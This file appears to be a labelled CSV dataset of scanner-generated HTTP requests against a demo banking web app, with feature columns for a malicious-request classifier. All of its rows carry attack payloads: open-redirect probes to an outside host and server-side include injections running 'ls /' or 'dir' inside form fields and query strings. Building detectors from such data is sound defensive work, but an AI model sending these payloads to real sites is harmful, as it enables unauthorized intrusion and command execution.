method,path,body,single_q,double_q,dashes,braces,spaces,badwords_count,class
GET,b'/Privacypolicy.jsp?sec=Careers&template=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&btnSubmit=Login',2,0,0,0,0,1,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=http%3A%2F%2F%5C6542095270498749340.owasp.org&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=http%3A%2F%2F%5C6542095270498749340.owasp.org&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=https%3A%2F%2F%5C6542095270498749340.owasp.org',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=https%3A%2F%2F%5C6542095270498749340.owasp.org&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doSubscribe',b'txtEmail=ZAP&btnSubmit=%2F%2F6542095270498749340.owasp.org',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=https%3A%2F%2F%5C6542095270498749340.owasp.org&btnSubmit=Login',0,0,0,0,0,1,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=%2F%2F6542095270498749340.owasp.org&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=%2F%2F6542095270498749340.owasp.org&btnSubmit=Login',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=6542095270498749340.owasp.org',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=http%3A%2F%2F6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=http%3A%2F%2F6542095270498749340.owasp.org',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=https%3A%2F%2F6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=https%3A%2F%2F6542095270498749340.owasp.org',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',2,0,0,0,7,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',2,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',2,0,0,0,7,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',2,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=http%3A%2F%2F%5C6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=http%3A%2F%2F%5C6542095270498749340.owasp.org',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=https%3A%2F%2F%5C6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=https%3A%2F%2F%5C6542095270498749340.owasp.org',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=%2F%2F6542095270498749340.owasp.org&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=ZAP&btnSubmit=%2F%2F6542095270498749340.owasp.org',0,0,0,0,0,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=6542095270498749340.owasp.org&comments=&submit=+Submit+',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=http%3A%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&comments=&submit=+Submit+',0,0,0,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&comments=&submit=+Submit+',2,0,0,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&comments=&submit=+Submit+',2,0,0,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=http%3A%2F%2F%5C6542095270498749340.owasp.org&comments=&submit=+Submit+',0,0,0,0,2,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=6542095270498749340.owasp.org',b'',0,0,0,0,3,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=https%3A%2F%2F%5C6542095270498749340.owasp.org&comments=&submit=+Submit+',0,0,0,0,2,0,bad
GET,b'/search.jsp?query=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,3,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=%2F%2F6542095270498749340.owasp.org&comments=&submit=+Submit+',0,0,0,0,2,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,3,0,bad
GET,b'/search.jsp?query=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=6542095270498749340.owasp.org&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/search.jsp?query=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,3,0,bad
GET,b'/static/index.jsp?content=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=http%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,3,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=http%3A%2F%2F6542095270498749340.owasp.org&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/static/index.jsp?content=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=https%3A%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=https%3A%2F%2F6542095270498749340.owasp.org&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,3,0,bad
GET,b'/static/index.jsp?content=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,3,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=https%3A%2F%2F6542095270498749340%252eowasp%252eorg&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/static/index.jsp?content=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/survey_questions.jsp?step=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/search.jsp?query=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27&submit=+Submit+',2,0,0,0,7,0,bad
GET,b'/survey_questions.jsp?step=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',b'',2,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,3,0,bad
GET,b'/search.jsp?query=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27&submit=+Submit+',2,0,0,0,7,0,bad
GET,b'/survey_questions.jsp?step=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=http%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,3,0,bad
GET,b'/search.jsp?query=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=http%3A%2F%2F%5C6542095270498749340.owasp.org&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/survey_questions.jsp?step=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=https%3A%2F%2F%5C6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=https%3A%2F%2F%5C6542095270498749340.owasp.org&submit=+Submit+',0,0,0,0,7,0,bad
GET,b'/survey_questions.jsp?step=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
GET,b'/static/index.jsp?content=%2F%2F6542095270498749340.owasp.org',b'',0,0,0,0,0,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=%2F%2F6542095270498749340.owasp.org&submit=+Submit+',0,0,0,0,7,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=6542095270498749340.owasp.org',0,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=http%3A%2F%2F6542095270498749340.owasp.org',0,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=https%3A%2F%2F6542095270498749340.owasp.org',0,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=https%3A%2F%2F6542095270498749340%252eowasp%252eorg',0,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=5%3BURL%3D%27https%3A%2F%2F6542095270498749340.owasp.org%27',2,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=URL%3D%27http%3A%2F%2F6542095270498749340.owasp.org%27',2,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=http%3A%2F%2F%5C6542095270498749340.owasp.org',0,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=https%3A%2F%2F%5C6542095270498749340.owasp.org',0,0,0,0,5,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=%2F%2F6542095270498749340.owasp.org',0,0,0,0,5,0,bad
POST,b'/doLogin',b'uid=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&passw=ZAP&btnSubmit=Login',0,2,2,0,2,1,bad
POST,b'/doSubscribe',b'txtEmail=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&btnSubmit=Subscribe',0,2,2,0,2,0,bad
POST,b'/sendFeedback',b'cfile=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,2,2,0,9,0,bad
POST,b'/sendFeedback',b'cfile=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,3,2,0,9,0,bad
GET,b'/Privacypolicy.jsp?sec=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&template=US',b'',0,2,2,0,2,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,2,0,bad
POST,b'/sendFeedback',b'cfile=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,2,2,0,9,0,bad
POST,b'/doSubscribe',b'txtEmail=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&btnSubmit=Subscribe',0,3,2,0,2,0,bad
POST,b'/doLogin',b'uid=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&passw=ZAP&btnSubmit=Login',0,3,2,0,2,1,bad
GET,b'/default.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/disclaimer.htm?url=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/Privacypolicy.jsp?sec=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&template=US',b'',0,3,2,0,2,0,bad
POST,b'/sendFeedback',b'cfile=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&name=ZAP&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,3,2,0,9,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/default.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C',b'',0,3,2,0,2,0,bad
POST,b'/doSubscribe',b'txtEmail=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&btnSubmit=Subscribe',0,2,2,0,2,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E',b'',0,2,2,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,2,2,0,9,0,bad
GET,b'/Privacypolicy.jsp?sec=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&template=US',b'',0,2,2,0,2,0,bad
POST,b'/doLogin',b'uid=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&passw=ZAP&btnSubmit=Login',0,2,2,0,2,1,bad
GET,b'/disclaimer.htm?url=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/images/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&job=MortgageLendingAccountExecutive%3ASales',b'',0,2,2,0,2,0,bad
GET,b'/default.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/Documents/JohnSmith/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/disclaimer.htm?url=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/Privacypolicy.jsp?sec=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&template=US',b'',0,3,2,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,3,2,0,9,0,bad
GET,b'/images/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C&job=MortgageLendingAccountExecutive%3ASales',b'',0,3,2,0,2,0,bad
POST,b'/doSubscribe',b'txtEmail=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&btnSubmit=Subscribe',0,3,2,0,2,0,bad
GET,b'/default.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/disclaimer.htm?url=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,2,0,bad
POST,b'/doLogin',b'uid=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&passw=ZAP&btnSubmit=Login',0,3,2,0,2,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,2,2,0,9,0,bad
GET,b'/images/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E&job=MortgageLendingAccountExecutive%3ASales',b'',0,2,2,0,2,0,bad
GET,b'/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/images/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&job=MortgageLendingAccountExecutive%3ASales',b'',0,3,2,0,2,0,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C&email_addr=ZAP&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,3,2,0,9,0,bad
GET,b'/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C',b'',0,3,2,0,2,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,5,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E',b'',0,2,2,0,2,0,bad
POST,b'/doLogin',b'uid=ZAP&passw=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&btnSubmit=Login',0,2,2,0,2,1,bad
POST,b'/sendFeedback',b'cfile=comments.txt&name=ZAP&email_addr=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&subject=Zaproxy+dolore+alias+impedit+expedita+quisquam.&comments=&submit=+Submit+',0,2,2,0,9,0,bad
GET,b'/index.jsp?content=inside_jobs.htm&job=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/search.jsp?query=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E',b'',0,2,2,0,2,0,bad
GET,b'/my%20documents/JohnSmith/Bank%20Site%20Documents/index.jsp?content=%22%3E%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E%3C',b'',0,3,2,0,5,0,bad
GET,b'/Privacypolicy.jsp?sec=Careers&template=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%5C%22--%3E%3C',b'',0,3,2,0,2,0,bad
